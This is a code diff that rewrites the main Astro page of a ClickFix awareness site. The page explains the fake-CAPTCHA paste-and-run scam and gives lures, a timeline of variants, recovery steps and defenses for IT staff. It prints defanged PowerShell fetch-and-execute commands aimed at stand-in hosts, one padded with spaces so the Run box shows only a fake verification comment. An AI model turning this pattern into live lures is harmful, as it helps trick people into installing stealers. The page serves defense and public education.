@@ -1,221 +1,675 @@
 ---
 import Layout from "../layouts/Layout.astro";
 import Header from "../components/Header.astro";
-import InteractiveDemo from "../components/Demo.astro";
-import NewsComponent from "../components/News.astro";
+import Footer from "../components/Footer.astro";
+import Demo from "../components/Demo.astro";
+import Reading from "../components/Reading.astro";
+
+const reviewed = "November 2026";
+
+const keys = [
+  { caps: ["Win", "R"], does: "opens the Run box" },
+  { caps: ["Ctrl", "V"], does: "pastes what the page copied" },
+  { caps: ["Enter"], does: "runs it" },
+];
+
+const lures = [
+  {
+    name: "A human check",
+    says: "“Verify you are human.” “I’m not a robot.”",
+    detail: "Often styled to look like Cloudflare or Google reCAPTCHA. Clicking the checkbox copies the command.",
+  },
+  {
+    name: "A page or browser error",
+    says: "“This page can’t be displayed. Click Fix it.” “Update your browser to view this document.”",
+    detail: "Shown on top of a real-looking site or document.",
+  },
+  {
+    name: "A video call that won’t work",
+    says: "“Your microphone isn’t working.” “Fix your camera to join.”",
+    detail: "A fake Google Meet, Zoom or Teams page, often sent as a meeting invite.",
+  },
+  {
+    name: "A Windows update screen",
+    says: "“Finish installing this update.”",
+    detail: "The browser goes full screen and imitates Windows Update, then asks you to run a command to complete it.",
+  },
+  {
+    name: "A broken browser",
+    says: "“Your browser stopped unexpectedly. Run this repair.”",
+    detail: "A fake extension makes the browser freeze, then offers the “fix” (CrashFix).",
+  },
+  {
+    name: "A file path to paste",
+    says: "“Copy this file path and paste it into File Explorer.”",
+    detail: "The “path” is a command with a fake path stuck on the end (FileFix).",
+  },
+  {
+    name: "A sign-in link to paste back",
+    says: "“Sign in, then copy the address from your browser and paste it here.”",
+    detail: "That address holds a key to your Microsoft account. No malware is involved, but the attacker gets in (ConsentFix).",
+  },
+];
+
+const timeline = [
+  {
+    when: "Mar–May 2024",
+    name: "ClickFix appears",
+    what: "PowerShell pasted into the Run box or a PowerShell window, from fake Word and Chrome errors.",
+    source: "Proofpoint",
+    url: "https://www.proofpoint.com/us/blog/threat-insight/security-brief-clickfix-social-engineering-technique-floods-threat-landscape",
+  },
+  {
+    when: "Oct 2024 – Feb 2025",
+    name: "Government hackers try it",
+    what: "Groups linked to Russia (APT28), North Korea (Kimsuky) and Iran (MuddyWater) use it in espionage campaigns.",
+    source: "Proofpoint",
+    url: "https://www.proofpoint.com/us/blog/threat-insight/around-world-90-days-state-sponsored-actors-try-clickfix",
+  },
+  {
+    when: "Jun 2025",
+    name: "FileFix",
+    what: "A command disguised as a file path, pasted into File Explorer’s address bar. Published as a proof of concept, then seen in real attacks.",
+    source: "Kaspersky",
+    url: "https://www.kaspersky.com/blog/filefix-attack-windows-file-explorer/54752/",
+  },
+  {
+    when: "2025",
+    name: "Macs targeted",
+    what: "Encoded <code>curl … | bash</code> one-liners pasted into Terminal, mostly delivering Atomic Stealer.",
+    source: "Microsoft",
+    url: "https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/",
+  },
+  {
+    when: "Dec 2025",
+    name: "ConsentFix",
+    what: "The victim pastes a <code>localhost</code> URL containing an OAuth authorization code from an Azure CLI sign-in. Nothing runs locally; the account is taken over.",
+    source: "Push Security",
+    url: "https://pushsecurity.com/blog/consentfix-debrief",
+  },
+  {
+    when: "Jan 2026",
+    name: "CrashFix",
+    what: "A fake ad-blocker extension crashes the browser. The “fix” abuses <code>finger.exe</code> to fetch a Python remote access trojan.",
+    source: "Microsoft",
+    url: "https://www.microsoft.com/en-us/security/blog/2026/02/05/clickfix-variant-crashfix-deploying-python-rat-trojan/",
+  },
+  {
+    when: "Feb 2026",
+    name: "Windows Terminal",
+    what: "<kbd>Win</kbd> + <kbd>X</kbd>, then <kbd>I</kbd> opens Windows Terminal instead of the Run box, getting around policies that only restrict Run. Delivered Lumma Stealer.",
+    source: "SecurityWeek, on Microsoft findings",
+    url: "https://www.securityweek.com/clickfix-attack-uses-windows-terminal-to-evade-detection/",
+  },
+  {
+    when: "Mar 2026",
+    name: "macOS pushes back",
+    what: "macOS Tahoe 26.4 warns when a command copied from the web is pasted into Terminal, and blocks known malware outright.",
+    source: "MacRumors, on Apple’s documentation",
+    url: "https://www.macrumors.com/2026/06/16/apple-details-terminal-anti-scam-warning-in-macos/",
+  },
+  {
+    when: "Oct 2026",
+    name: "Cache smuggling",
+    what: "The page loads the payload into the browser cache disguised as an image. The short Run-box command finds and runs it, so there’s no download to detect.",
+    source: "iTnews, on Microsoft findings",
+    url: "https://www.itnews.com.au/news/microsoft-spots-new-twist-on-clickfix-cache-smuggling-629401",
+  },
+];
 ---
 
-<Layout title="ClickFix: from fake CAPTCHA to command execution — ClickFix.fyi" description="A working ClickFix demo, an explanation of the attack, and steps to take if you ran the command.">
+<Layout
+  title="ClickFix: no real website will ask you to press these keys"
+  description="ClickFix pages trick you into pasting a command that installs malware. See how it works with a safe demo, learn what the trap looks like, and what to do if you already ran it."
+>
   <Header />
 
-  <main id="main-content" class="docs-layout container">
-    <aside class="docs-nav" aria-label="On this page">
-      <p>On this page</p>
-      <nav>
-        <a href="#demo">Demo</a>
-        <a href="#how-it-works">How it works</a>
-        <a href="#common-prompts">Common fake prompts</a>
-        <a href="#already-ran-it">If you ran it</a>
-        <a href="#sources">News</a>
-      </nav>
-    </aside>
+  <main id="main">
+    <section class="hero wrap" aria-labelledby="hero-title">
+      <h1 id="hero-title">No real website will ask you to press these keys.</h1>
 
-    <article class="docs-article">
-      <header class="article-header" id="overview">
-        <h1>ClickFix: from fake CAPTCHA to command execution</h1>
-        <p class="article-summary">
-          ClickFix is a social engineering technique that uses fake CAPTCHAs or error messages to trick someone into copying and running a command. The command typically downloads malware.
+      <ol class="keys" aria-label="The key sequence a ClickFix page asks for">
+        {keys.map((step) => (
+          <li>
+            <span class="caps">
+              {step.caps.map((cap, i) => (
+                <>
+                  {i > 0 && <span class="plus" aria-hidden="true">+</span>}
+                  <kbd class="cap">{cap}</kbd>
+                </>
+              ))}
+            </span>
+            <span class="does">{step.does}</span>
+          </li>
+        ))}
+      </ol>
+
+      <div class="hero-text measure">
+        <p class="lead">
+          If a CAPTCHA, error message or “fix” tells you to open a box on your computer and paste something into it,
+          close the page. It’s a scam called ClickFix, and following the steps installs the attacker’s malware.
         </p>
-        <p class="demo-intro">The interactive demo below reproduces this sequence using a harmless script.</p>
-      </header>
+        <p class="mac-note">
+          On a Mac, the page asks you to open Terminal and press <kbd>⌘</kbd> + <kbd>V</kbd>. Same scam.
+        </p>
+        <p class="hero-links">
+          <a class="go" href="#demo">Try a safe version</a>
+          <a class="urgent" href="#ran-it">I already did it</a>
+        </p>
+      </div>
+    </section>
 
-      <section id="demo" class="demo-section">
-        <InteractiveDemo />
-      </section>
+    <section class="block wrap" id="what" aria-labelledby="what-title">
+      <h2 id="what-title">What ClickFix is</h2>
+      <div class="measure prose">
+        <p>
+          ClickFix gets you to install malware yourself. A web page shows you something familiar: a “verify you’re
+          human” check, a browser error, a video call that won’t connect, a document that won’t open. When you click,
+          the page quietly copies a command to your clipboard. Then it tells you how to “fix” the problem: open a box
+          on your computer, paste, press Enter.
+        </p>
+        <p>
+          That box runs whatever you paste. The command downloads malware, usually a stealer that takes saved
+          passwords, logged-in sessions and crypto wallets. On work computers it often installs remote-access tools
+          that give the attacker a way into the company network.
+        </p>
+        <p>
+          It works because nothing looks wrong. There’s no file to download or attachment to open, and the program
+          that runs the command is part of Windows or macOS. It first appeared in 2024 and is now one of the most
+          common ways attackers get in. Microsoft’s 2025 Digital Defense Report ranked it first, ahead of ordinary
+          phishing.
+        </p>
+      </div>
+      <p class="rule">
+        A website can’t fix your computer by having you paste something. Not a CAPTCHA, not a browser update, not a
+        meeting app, not tech support.
+      </p>
+    </section>
 
-      <section id="how-it-works">
-        <h2>How it works</h2>
-        <p>ClickFix is a way to deliver malware, not a specific piece of malware. What gets installed varies between campaigns.</p>
-        <ol class="sequence detailed-sequence">
-          <li><div><strong>The page shows a fake prompt.</strong><p>A malicious or compromised page displays a familiar CAPTCHA, browser error, meeting problem, or document error.</p></div></li>
-          <li><div><strong>The button copies a command.</strong><p>The button claims to copy a verification code or fix. It copies a command instead.</p></div></li>
-          <li><div><strong>The user opens a system tool.</strong><p>The page directs the user to open Run, PowerShell, Terminal, Command Prompt, or File Explorer.</p></div></li>
-          <li><div><strong>The user runs the command.</strong><p>The system tool executes whatever the attacker placed on the clipboard.</p><pre aria-label="Defanged example ClickFix command"><code>powershell.exe -NoProfile -WindowStyle Hidden -Command "irm https://secure-check.example.invalid/update.ps1 | iex"</code></pre><small>The reserved <code>.invalid</code> domain cannot resolve, so this example cannot download a payload.</small></div></li>
-          <li><div><strong>The command downloads malware.</strong><p>The downloaded malware then runs on the device.</p></div></li>
-        </ol>
+    <section class="block wrap" id="demo" aria-labelledby="demo-title">
+      <h2 id="demo-title">Try it safely</h2>
+      <p class="measure intro">
+        Here’s the scam step by step, on a fake page. The only thing it does to your computer is put a harmless line
+        of text on your clipboard. If that text ends up somewhere that runs commands, it prints a message and stops.
+        It doesn’t download anything.
+      </p>
+      <Demo />
+    </section>
 
-      </section>
+    <section class="block wrap" id="looks" aria-labelledby="looks-title">
+      <h2 id="looks-title">What the trap looks like</h2>
+      <p class="measure intro">
+        The disguise changes constantly; the request doesn’t. These are the ones seen most often. They turn up on
+        hacked websites you’d normally trust, in search ads, on fake download pages and in emails.
+      </p>
+      <dl class="lures">
+        {lures.map((lure) => (
+          <div>
+            <dt>{lure.name}</dt>
+            <dd class="says">{lure.says}</dd>
+            <dd>{lure.detail}</dd>
+          </div>
+        ))}
+      </dl>
+    </section>
 
-      <section id="common-prompts">
-        <h2>Common fake prompts</h2>
-        <ul class="disguise-list">
-          <li>“Verify you are human”</li>
-          <li>“Your browser needs an update”</li>
-          <li>“The document cannot be displayed”</li>
-          <li>“Your microphone or meeting connection failed”</li>
-        </ul>
-      </section>
-
-      <section id="already-ran-it">
-        <h2>If you ran the command</h2>
-        <div class="warning compact" role="note">
-          <strong>Treat the device as compromised.</strong>
+    <section class="ran" id="ran-it" aria-labelledby="ran-title">
+      <div class="wrap">
+        <h2 id="ran-title">If you already ran it</h2>
+        <div class="measure prose">
+          <p>
+            Assume the attacker now has what was on that computer: saved passwords, logged-in accounts and files.
+            Act now. The steps below take an hour or two.
+          </p>
+          <p class="relief">
+            Pasted but never pressed <kbd>Enter</kbd>? Then nothing ran. Close the box and you’re fine. The same goes
+            for anything you pasted into the practice box on this page.
+          </p>
         </div>
-        <ol class="response-list">
-          <li><strong>Disconnect the affected computer.</strong> Turn off Wi-Fi and unplug the network cable.</li>
-          <li><strong>Secure your accounts.</strong> From another device, sign out active sessions and change credentials that may have been exposed.</li>
-          <li><strong>Clean or rebuild the device.</strong> A clean antivirus scan does not prove the malware is gone. Reinstall the operating system or have the device inspected.</li>
-        </ol>
-      </section>
 
-      <section id="sources">
-        <h2>ClickFix news</h2>
-        <NewsComponent />
-      </section>
-    </article>
+        <div class="ran-grid">
+          <section aria-labelledby="ran-work">
+            <h3 id="ran-work">On a work computer</h3>
+            <ol class="steps">
+              <li>
+                <strong>Disconnect it from the network.</strong> Turn off Wi-Fi or unplug the cable. Don’t shut it
+                down or try to clean it; your IT team may need what’s on it.
+              </li>
+              <li>
+                <strong>Tell IT or security right away,</strong> by phone or from another device. Say which page you
+                were on, what you pasted and when. They see this often, and every minute counts more than any
+                embarrassment.
+              </li>
+              <li><strong>Follow their instructions</strong> for passwords and accounts.</li>
+            </ol>
+          </section>
+
+          <section aria-labelledby="ran-home">
+            <h3 id="ran-home">On a personal computer</h3>
+            <ol class="steps">
+              <li><strong>Disconnect it from the internet.</strong> Turn off Wi-Fi or unplug the cable.</li>
+              <li>
+                <strong>Use a different device for everything below.</strong> Anything you type on the affected
+                computer could be recorded.
+              </li>
+              <li>
+                <strong>Secure your email first.</strong> Change the password, then use “sign out of all devices”.
+                Stealers copy the sessions you’re already logged in to, so a new password alone doesn’t lock the
+                attacker out.
+              </li>
+              <li>
+                <strong>Then everything else, most important first:</strong> password manager, bank and payment
+                accounts, your Apple, Google or Microsoft account, then social media. For each: new password, sign out
+                everywhere, turn on two-step verification.
+              </li>
+              <li>
+                <strong>Move any cryptocurrency</strong> that computer could reach to a new wallet set up on a clean
+                device. Stealers go for wallets first and empty them fast.
+              </li>
+              <li>
+                <strong>Reset the computer.</strong> Back up your documents and photos (not programs), then erase it
+                and reinstall the operating system. A clean antivirus scan doesn’t prove the malware is gone.
+              </li>
+              <li>
+                <strong>Watch your accounts</strong> and bank statements for the next few weeks, and tell your bank
+                about anything you don’t recognize.
+              </li>
+            </ol>
+          </section>
+        </div>
+      </div>
+    </section>
+
+    <section class="block wrap tech" id="for-it" aria-labelledby="it-title">
+      <h2 id="it-title">For IT and security teams</h2>
+      <p class="measure intro">
+        The technical version: how the chain works, how it has changed since 2024, and what actually reduces the
+        risk.
+      </p>
+
+      <h3>The chain</h3>
+      <ol class="chain measure">
+        <li>
+          <strong>Delivery.</strong> JavaScript injected into compromised sites (often WordPress), malicious ads and
+          poisoned search results, phishing with HTML attachments or links, fake software and GitHub pages.
+        </li>
+        <li>
+          <strong>Clipboard write.</strong> A click on the fake checkbox or button calls
+          <code>navigator.clipboard.writeText()</code>. Browsers allow this on any user click, with no prompt.
+        </li>
+        <li>
+          <strong>Execution surface.</strong> The victim opens the Run box (<kbd>Win</kbd> + <kbd>R</kbd>), Windows
+          Terminal (<kbd>Win</kbd> + <kbd>X</kbd>, <kbd>I</kbd>), File Explorer’s address bar, PowerShell, or macOS
+          Terminal, and pastes.
+        </li>
+        <li>
+          <strong>Command.</strong> A built-in tool fetches stage two: <code>powershell</code> with
+          <code>iwr</code>/<code>irm</code> piped to <code>iex</code>, <code>mshta</code>, <code>curl</code>,
+          <code>finger</code>, <code>net use</code> to a WebDAV share, or <code>cmd</code> launching
+          <code>wscript</code>. On Windows it’s usually padded with spaces and a trailing comment, so the Run box
+          shows only the comment.
+        </li>
+        <li>
+          <strong>Payload.</strong> Mostly infostealers (Lumma, Vidar, StealC, and Atomic Stealer on macOS), loaders,
+          and remote access tools such as AsyncRAT and NetSupport, which can lead to ransomware.
+        </li>
+      </ol>
+
+      <figure class="sample">
+        <pre><code>powershell -w h -c "iwr hxxps://cdn-check[.]example/v.ps1 | iex"                                        # ✅ I am not a robot - Verification ID: 4821</code></pre>
+        <figcaption>
+          A representative command, defanged so it can’t run. <code>-w h</code> hides the window. The Run box is
+          too narrow to show anything but the comment at the end.
+        </figcaption>
+      </figure>
+
+      <h3>How it has changed</h3>
+      <div class="table-scroll" role="region" aria-label="ClickFix timeline" tabindex="0">
+        <table class="timeline">
+          <thead>
+            <tr>
+              <th scope="col">When</th>
+              <th scope="col">What changed</th>
+              <th scope="col">Source</th>
+            </tr>
+          </thead>
+          <tbody>
+            {timeline.map((row) => (
+              <tr>
+                <td class="when">{row.when}</td>
+                <td>
+                  <strong>{row.name}.</strong> <span set:html={row.what} />
+                </td>
+                <td class="src"><a href={row.url} rel="noopener noreferrer">{row.source}</a></td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
+      </div>
+
+      <h3>What reduces the risk</h3>
+      <ul class="defenses measure">
+        <li>
+          <strong>Train one rule, not a gallery of lures.</strong> The disguises change weekly. “No legitimate site
+          asks you to paste anything into Run, Terminal or an address bar” doesn’t.
+        </li>
+        <li>
+          <strong>Remove the Run box where people don’t need it</strong> (Group Policy “Remove Run menu from Start
+          Menu”, or the <code>NoRun</code> registry value). This closes one door only: Windows Terminal, PowerShell
+          and File Explorer’s address bar stay open, and attackers have already moved to them.
+        </li>
+        <li>
+          <strong>Use application control</strong> (App Control for Business or AppLocker) to block the tools that
+          standard users never need: <code>mshta</code>, <code>wscript</code>/<code>cscript</code>,
+          <code>finger</code>, and PowerShell for people who don’t use it. Where PowerShell stays, enforce Constrained
+          Language Mode and turn on script block logging.
+        </li>
+        <li>
+          <strong>Keep Macs on macOS 26.4 or later</strong> so Terminal warns about pasted commands. Windows has no
+          equivalent for the Run box. Windows Terminal’s paste warnings only cover multi-line and very large pastes,
+          not a one-line command.
+        </li>
+        <li>
+          <strong>Hunt where the activity is.</strong> <code>explorer.exe</code> or <code>WindowsTerminal.exe</code>
+          starting <code>powershell</code>, <code>mshta</code> or <code>cmd</code> that then makes network
+          connections; the <code>RunMRU</code> registry key
+          (<code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</code>), which records Run-box
+          commands; outbound TCP 79 (finger); and new WebDAV mounts. Cache-smuggling variants create no download
+          event, so don’t rely on one.
+        </li>
+        <li>
+          <strong>Make stolen sessions worth less.</strong> Use phishing-resistant MFA and token protection, turn
+          off browser password saving on managed devices, and keep session lifetimes short. For ConsentFix, restrict
+          or monitor sign-ins to Azure CLI and other first-party Microsoft apps with Conditional Access.
+        </li>
+      </ul>
+    </section>
+
+    <section class="block wrap" id="reading" aria-labelledby="reading-title">
+      <h2 id="reading-title">Sources and further reading</h2>
+      <div class="measure">
+        <Reading />
+      </div>
+    </section>
   </main>
+
+  <Footer reviewed={reviewed} />
 </Layout>
 
 <style>
-  .docs-layout {
+  /* ---------- Hero ---------- */
+  .hero {
+    padding-block: clamp(2.5rem, 8vw, 6rem) clamp(2rem, 6vw, 4rem);
+  }
+
+  .hero h1 {
+    max-width: 15ch;
+  }
+
+  .keys {
+    display: flex;
+    flex-wrap: wrap;
+    gap: clamp(1.25rem, 3vw, 2.75rem);
+    margin-block: clamp(2rem, 5vw, 3.5rem);
+    padding: 0;
+    list-style: none;
+  }
+
+  .keys li {
     display: grid;
-    grid-template-columns: 190px minmax(0, 900px);
-    gap: clamp(3rem, 8vw, 7rem);
-    justify-content: center;
-    padding-block: 3rem 6rem;
+    align-content: start;
+    gap: 0.75rem;
+    justify-items: start;
   }
 
-  .docs-nav {
-    position: sticky;
-    top: 104px;
-    align-self: start;
-    border-left: 1px solid var(--line);
-    padding-left: 1rem;
+  .caps {
+    display: flex;
+    gap: 0.5rem;
+    align-items: center;
   }
 
-  .docs-nav > p {
-    margin-bottom: 0.7rem;
-    color: var(--ink);
-    font-size: 0.78rem;
-    font-weight: 700;
+  .cap {
+    min-width: 2.4em;
+    border: 2px solid var(--ink);
+    border-bottom-width: 7px;
+    border-radius: 12px;
+    padding: 0.3em 0.55em 0.25em;
+    background: var(--paper);
+    font-size: clamp(1.4rem, 4vw, 2.6rem);
+    font-weight: 600;
+    line-height: 1.1;
   }
 
-  .docs-nav nav {
-    display: grid;
-    gap: 0.55rem;
+  .plus {
+    color: var(--muted);
+    font-family: var(--mono);
+    font-size: clamp(1.1rem, 2.5vw, 1.6rem);
   }
 
-  .docs-nav a {
-    color: var(--ink-soft);
-    font-size: 0.82rem;
+  .does {
+    max-width: 15rem;
+    color: var(--muted);
+    font-family: var(--ui);
+    font-size: 0.95rem;
     line-height: 1.35;
-    text-decoration: none;
   }
 
-  .docs-nav a:hover { color: var(--signal); }
-
-  .docs-article { min-width: 0; }
-
-  .article-header {
-    padding-bottom: 0;
+  .lead {
+    font-size: clamp(1.2rem, 2.2vw, 1.45rem);
+    line-height: 1.5;
   }
 
-  .article-header h1 {
-    margin-bottom: 1rem;
-    font-size: clamp(2.3rem, 5vw, 3.75rem);
+  .mac-note {
+    margin-top: 1rem;
+    color: var(--muted);
   }
 
-  .article-summary {
-    max-width: 44rem;
-    margin: 0;
-    color: var(--ink-soft);
-    font-size: clamp(1.05rem, 1.8vw, 1.2rem);
-    line-height: 1.55;
-  }
-
-  .demo-intro {
-    max-width: 44rem;
-    margin: 0.85rem 0 0;
-    color: var(--ink-soft);
-    font-size: clamp(1.05rem, 1.8vw, 1.2rem);
-    line-height: 1.55;
-  }
-
-  .docs-article section {
-    padding-block: 2.75rem;
-    border-bottom: 1px solid var(--line);
-    scroll-margin-top: 100px;
-  }
-
-  .docs-article .demo-section { padding-top: 1.5rem; }
-
-  .docs-article section h2 {
-    margin-bottom: 1rem;
-    font-size: clamp(1.65rem, 3vw, 2.15rem);
-  }
-
-  .docs-article section > p,
-  .docs-article li {
-    color: var(--ink-soft);
+  .hero-links {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.75rem 1.5rem;
+    align-items: center;
+    margin-top: 2rem;
+    font-family: var(--ui);
     font-size: 1rem;
   }
 
-  .warning {
-    margin-block: 2rem;
-    border: 1px solid #d8a6a0;
-    border-left: 5px solid var(--signal);
-    padding: 1.1rem 1.25rem;
-    background: #fff5f4;
+  .go {
+    border-radius: 8px;
+    padding: 0.8rem 1.2rem;
+    background: var(--ink);
+    color: var(--paper);
+    font-weight: 600;
+    text-decoration: none;
   }
 
-  .warning strong { color: var(--signal-dark); }
-  .warning p { margin: 0.35rem 0 0; color: var(--ink-soft); }
-  .warning.compact { margin-block: 1.25rem 1.75rem; }
-
-  .sequence {
-    margin: 1.5rem 0;
-    padding: 0;
-    list-style: none;
-    counter-reset: step;
+  .go:hover {
+    background: #343a42;
   }
 
-  .sequence li {
+  .urgent {
+    color: var(--stop);
+    font-weight: 600;
+  }
+
+  /* ---------- Sections ---------- */
+  .block {
+    padding-top: clamp(3.5rem, 9vw, 6.5rem);
+    scroll-margin-top: 1rem;
+  }
+
+  .block > h2,
+  .ran h2 {
+    margin-bottom: 1.25rem;
+  }
+
+  .block > h3 {
+    margin: 3rem 0 1rem;
+  }
+
+  .intro {
+    color: var(--ink);
+  }
+
+  .prose p + p {
+    margin-top: 1rem;
+  }
+
+  .rule {
+    max-width: 30ch;
+    margin-top: 2.5rem;
+    border-left: 5px solid var(--stop);
+    padding-left: 1.25rem;
+    font-size: clamp(1.4rem, 3vw, 2rem);
+    font-weight: 560;
+    line-height: 1.25;
+    text-wrap: balance;
+  }
+
+  /* ---------- Lures ---------- */
+  .lures {
     display: grid;
-    grid-template-columns: 2rem minmax(0, 1fr);
-    gap: 0.8rem;
-    padding: 1rem 0;
-    counter-increment: step;
+    grid-template-columns: repeat(auto-fill, minmax(min(100%, 19rem), 1fr));
+    gap: 2rem 2.5rem;
+    margin: 2.25rem 0 0;
   }
 
-  .sequence li > div { min-width: 0; }
-
-  .sequence li + li { border-top: 1px solid #d9dee1; }
-  .sequence li::before { content: counter(step) "."; color: var(--signal); font-family: var(--font-mono); font-weight: 700; }
-  .sequence strong { color: var(--ink); }
-  .sequence p { margin: 0.25rem 0 0; }
-
-  .detailed-sequence small { display: block; margin-top: 0.45rem; color: var(--ink-soft); }
-  pre { overflow-x: auto; margin: 0.9rem 0 0; border: 1px solid #3b4348; border-radius: 4px; padding: 0.9rem; background: #171c20; color: #e8ecee; }
-  pre code { padding: 0; background: transparent; }
-  .disguise-list { margin: 1.4rem 0 0; padding-left: 1.25rem; }
-  .disguise-list li { margin-bottom: 0.65rem; }
-
-  .response-list { padding-left: 1.35rem; }
-  .response-list li { margin-bottom: 0.9rem; padding-left: 0.3rem; }
-  .response-list strong { color: var(--ink); }
-
-  .docs-article section:last-child { border-bottom: 0; }
-
-  @media (max-width: 800px) {
-    .docs-layout { grid-template-columns: 1fr; gap: 0; padding-top: 2rem; }
-    .docs-nav { display: none; }
+  .lures > div {
+    border-top: 1px solid var(--rule);
+    padding-top: 0.9rem;
   }
 
-  @media (max-width: 520px) {
-    .docs-layout { padding-bottom: 3rem; }
-    .article-header h1 { font-size: 2rem; line-height: 1.08; }
-    .article-summary,
-    .demo-intro { font-size: 1rem; }
-    .docs-article section { padding-block: 2.25rem; }
+  .lures dt {
+    font-weight: 620;
+  }
+
+  .lures dd {
+    margin: 0.35rem 0 0;
+    color: var(--muted);
+    font-size: 1rem;
+    line-height: 1.5;
+  }
+
+  .lures .says {
+    color: var(--ink);
+    font-style: italic;
+  }
+
+  /* ---------- If you ran it ---------- */
+  .ran {
+    margin-top: clamp(3.5rem, 9vw, 6.5rem);
+    padding-block: clamp(2.5rem, 7vw, 4.5rem);
+    background: var(--stop-wash);
+    scroll-margin-top: 0;
+  }
+
+  .ran h2 {
+    color: var(--stop-deep);
+  }
+
+  .relief {
+    border-left: 3px solid var(--ink);
+    padding-left: 1rem;
+  }
+
+  .ran-grid {
+    display: grid;
+    grid-template-columns: minmax(0, 0.8fr) minmax(0, 1.2fr);
+    gap: 2.5rem clamp(2rem, 5vw, 4.5rem);
+    margin-top: 2.5rem;
+  }
+
+  .ran-grid h3 {
+    margin-bottom: 1rem;
+  }
+
+  .steps {
+    display: grid;
+    gap: 0.9rem;
+    padding-left: 1.4rem;
+  }
+
+  .steps li::marker {
+    color: var(--stop-deep);
+    font-weight: 700;
+  }
+
+  /* ---------- Technical ---------- */
+  .chain,
+  .defenses {
+    display: grid;
+    gap: 0.9rem;
+    padding-left: 1.4rem;
+  }
+
+  .sample {
+    margin-top: 2rem;
+  }
+
+  .sample pre {
+    overflow-x: auto;
+    border-radius: 8px;
+    padding: 1rem 1.1rem;
+    background: var(--ink);
+    color: #eef0f2;
+    font-size: 0.85rem;
+    line-height: 1.6;
+  }
+
+  .sample code {
+    overflow-wrap: normal;
+  }
+
+  .sample figcaption {
+    max-width: var(--measure);
+    margin-top: 0.6rem;
+    color: var(--muted);
+    font-size: 1rem;
+  }
+
+  .table-scroll {
+    overflow-x: auto;
+  }
+
+  .timeline {
+    width: 100%;
+    min-width: 40rem;
+    border-collapse: collapse;
+    font-size: 1rem;
+    line-height: 1.5;
+  }
+
+  .timeline th {
+    border-bottom: 2px solid var(--ink);
+    padding: 0 1rem 0.5rem 0;
+    font-family: var(--ui);
+    font-size: 0.875rem;
+    font-weight: 600;
+    text-align: left;
+  }
+
+  .timeline td {
+    border-bottom: 1px solid var(--rule);
+    padding: 0.85rem 1.25rem 0.85rem 0;
+    vertical-align: top;
+  }
+
+  .timeline .when {
+    width: 9rem;
+    font-family: var(--ui);
+    font-size: 0.9rem;
+    white-space: nowrap;
+  }
+
+  .timeline .src {
+    width: 13rem;
+    font-family: var(--ui);
+    font-size: 0.9rem;
+  }
+
+  @media (max-width: 48rem) {
+    .ran-grid {
+      grid-template-columns: 1fr;
+    }
   }
 </style>
